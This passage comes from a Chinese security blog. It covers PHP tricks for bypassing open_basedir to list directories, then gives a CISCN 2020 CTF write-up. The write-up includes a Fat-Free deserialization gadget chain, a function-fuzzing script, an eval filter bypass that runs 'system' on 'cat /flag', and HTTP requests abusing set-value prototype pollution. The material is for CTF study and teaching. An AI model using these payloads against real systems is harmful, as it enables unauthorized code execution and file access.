for ($i=0; $i &lt; strlen($chars); $i++) {
    $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&lt;&#39;);
    $re = $info-&gt;getRealPath();
    if ($re) {
        echo $re.&quot;&lt;br&gt;&quot;;
    }
}</code></pre>
<h2 id="GD库imageftbbox-imagefttext列举目录"><a href="#GD库imageftbbox-imagefttext列举目录" class="headerlink" title="GD库imageftbbox/imagefttext列举目录"></a>GD库imageftbbox/imagefttext列举目录</h2><pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexists&#39;);
$dir = &#39;d:/test/&#39;;
$file = &#39;&#39;;
$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
for ($i=0; $i &lt; strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
    //$m = imagecreatefrompng(&quot;zip.png&quot;);
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);
    imageftbbox(100, 100, $file, &#39;aaa&#39;);
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, &#39;Invalid font filename&#39;) === FALSE) {
        printf(&quot;%s&lt;br/&gt;&quot;, $file);
    }
}
?&gt;</code></pre>
<h2 id="bindtextdomain暴力猜解目录"><a href="#bindtextdomain暴力猜解目录" class="headerlink" title="bindtextdomain暴力猜解目录"></a>bindtextdomain暴力猜解目录</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> 如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。 </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain" target="_blank" rel="noopener">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/bypass_disable_function_open_basedir/">https://www.ccreater.top/1970/01/01/bypass_disable_function_open_basedir/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/bypass_disable_function_open_basedir/" data-id="ckmn5756s004rs1ni1fceh5ff" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
<pre><code class="php">&lt;?php
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
}


namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected
            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],
            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],
            $db;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        function __construct($val){
            $this-&gt;db = $val;
        }
    }
}
namespace CLI{
    class Agent {
        protected
            $server=&quot;&quot;;
        public $events;
        public function __construct(){
            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];
            $this-&gt;server=&amp;$this;


        }
    };
    class WS{}
}
namespace {
    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
}</code></pre>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<pre><code class="php">&lt;?php

    $payloads=[
        &quot;ls&quot;,//shell命令执行测试
        &quot;index.php&quot;,//读取文件测试
        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
        &quot;echo 123;&quot;//php命令执行测试
    ];
    $str=file_get_contents(&quot;fatalerr.log&quot;);
    if(!$str){
        $str=&quot;[]&quot;;
    }
    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo &quot;$func($v,false,true) return value:&quot;;
            var_dump($r);
            echo &quot;&lt;br /&gt;&quot;;
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;

        foreach($a as $val){

            if(is_array($val)){
                brute_func($val);
                continue;
            }

            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;

                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);

            }
            array_pop($fatalerror);

        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?&gt;</code></pre>
<p>多次执行发现：</p>
<pre><code class="php">stream_socket_server
exec
stream_socket_client</code></pre>
<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
<p>很简单利用字符串拼接绕过</p>
<p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
<pre><code class="php">&lt;?php
class trick{
    public $trick1;
    public $trick2;
}


$t = new trick;
$t-&gt;trick1 = &quot;INF&quot;;
$t-&gt;trick2 = 1e1111;
echo serialize($t);
</code></pre>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit

                       === npm audit security report ===

# Run  npm update set-value --depth 1  to resolve 1 vulnerability

  High            Prototype Pollution

  Package         set-value

  Dependency of   set-value

  Path            set-value

  More info       https://npmjs.com/advisories/1012



found 1 high severity vulnerability in 61 scanned packages
  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
<ul>
<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
</ul>
<pre><code>POST /Privilege HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4

POST /DeveloperControlPanel HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/ciscn2020预选赛/">https://www.ccreater.top/1970/01/01/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="ckmn5756t004ws1nidcqeey1n" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
          </li>
        
          <li>
            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>